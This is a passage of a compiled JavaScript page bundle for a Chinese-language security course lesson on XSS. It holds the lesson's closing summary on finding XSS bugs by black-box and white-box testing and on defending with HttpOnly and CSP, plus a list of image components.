情况，避免折腾半天也没找到 XSS 利用失败的原因。现在 Google 内部一直在大力推行 CSP，这确实是一种防御 XSS 攻击的有效办法。",-1),O=s("h3",{id:"总结",tabindex:"-1"},[a("总结 "),s("a",{class:"header-anchor",href:"#总结","aria-label":'Permalink to "总结"'},"​")],-1),I=s("p",null,"这一讲我介绍了黑盒测试和白盒测试这两种挖掘 XSS 漏洞的方法，并针对不同的 XSS 情况推荐了不同的防御方案，算是一份 XSS 漏洞修复方案指引。同时，我还介绍了一些在企业中经常用来防御 XSS 攻击的方法：HttpOnly 和 CSP。它们可以有效减少 XSS 攻击带来的危害，但不能单纯依靠它们来防御 XSS，关键还是要避免漏洞的发生。",-1),H=s("p",null,"如果你对 XSS 漏洞的防御方法还有任何疑问，欢迎留言讨论。下一讲，我将带领你踏上 SQL 注入的攻防之路。",-1);function U(j,R,J,W,Q,G){const t=n("Image");return e(),c("div",null,[i,p(t,{alt:"Drawing 0.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A3/CgpVE1_gOVSAXGS3AAFuAZ0WAc8505.png"}),a(),y,g,p(t,{alt:"Drawing 1.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A3/CgpVE1_gOWGAUjfjAAA_jQElj0I731.png"}),a(),h,S,p(t,{alt:"Drawing 2.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A3/CgpVE1_gOWmABQ9EAADPA1r9pjM688.png"}),a(),E,p(t,{alt:"Drawing 3.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A3/CgpVE1_gOhSAFncFAAD54yWg-JA197.png"}),a(),d,p(t,{alt:"Drawing 4.png",src:"https://s0.lgstatic.com/i/image/M00/8B/CC/CgqCHl_gO6yAc_s3AAGcJQYwIUQ445.png"}),a(),_,p(t,{alt:"Drawing 5.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gO76AVkj9AAAzp-O1rbU774.png"}),a(),u,C,p(t,{alt:"Drawing 6.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A2/Cip5yF_gO8WAeDzJAAAT9ObloPA103.png"}),a(),m,p(t,{alt:"Drawing 7.png",src:"https://s0.lgstatic.com/i/image/M00/8B/CC/CgqCHl_gO9mAdRs_AABsm8OWsbs654.png"}),a(),A,p(t,{alt:"Drawing 8.png",src:"https://s0.lgstatic.com/i/image/M00/8B/C1/Ciqc1F_gO-SAWQl0AAbouv6er5w361.png"}),a(),F,p(t,{alt:"Drawing 9.png",src:"https://s0.lgstatic.com/i/image/M00/8B/CC/CgqCHl_gO_CARQ8zAARc2hmr8mY249.png"}),a(),b,p(t,{alt:"图片11.png",src:"https://s0.lgstatic.com/i/image/M00/8C/36/Ciqc1F_pfG2AJevWAAGvhSxGKxk804.png"}),a(),v,X,p(t,{alt:"图片14.png",src:"https://s0.lgstatic.com/i/image/M00/8C/36/Ciqc1F_pfHaAfNXbAADXUYehbs4744.png"}),a(),k,p(t,{alt:"图片15.png",src:"https://s0.lgstatic.com/i/image/M00/8C/41/CgqCHl_pfH-AN_QGAAE9xCbnNNc546.png"}),a(),D,p(t,{alt:"图片16.png",src:"https://s0.lgstatic.com/i/image2/M01/04/19/Cip5yF_pfJKAUVygAASq2AlxRQQ453.png"}),a(),f,q,p(t,{alt:"图片17.png",src:"https://s0.lgstatic.com/i/image2/M01/04/1A/CgpVE1_pfJ-AHUeqAAVEa4jRM4U161.png"}),a(),T,B,P,p(t,{alt:"Drawing 11.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A2/Cip5yF_gPDOAXIpRAAHMIeQ0UA0465.png"}),a(),x,p(t,{alt:"图片18.png",src:"https://s0.lgstatic.com/i/image2/M01/04/1B/CgpVE1_pfKyAAExhAAdH-EdHz9I669.png"}),a(),M,p(t,{alt:"图片19.png",src:"https://s0.lgstatic.com/i/image/M00/8C/41/CgqCHl_pfQaAAj0uAAHaIttkJoE538.png"}),a(),w,N,p(t,{alt:"Drawing 12.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A2/Cip5yF_gPEmAfrG1AAEbuo1t3ss905.png"}),a(),L,V,O,I,H,p(t,{alt:"Lark20201228-143535.png",src:"https://s0.lgstatic.com/i/image/M00/8C/36/Ciqc1F_pfMKAawzZAAUhtOcPIMw458.png"})])}const Y=l(r,[["render",U]]);export{z as __pageData,Y as default};
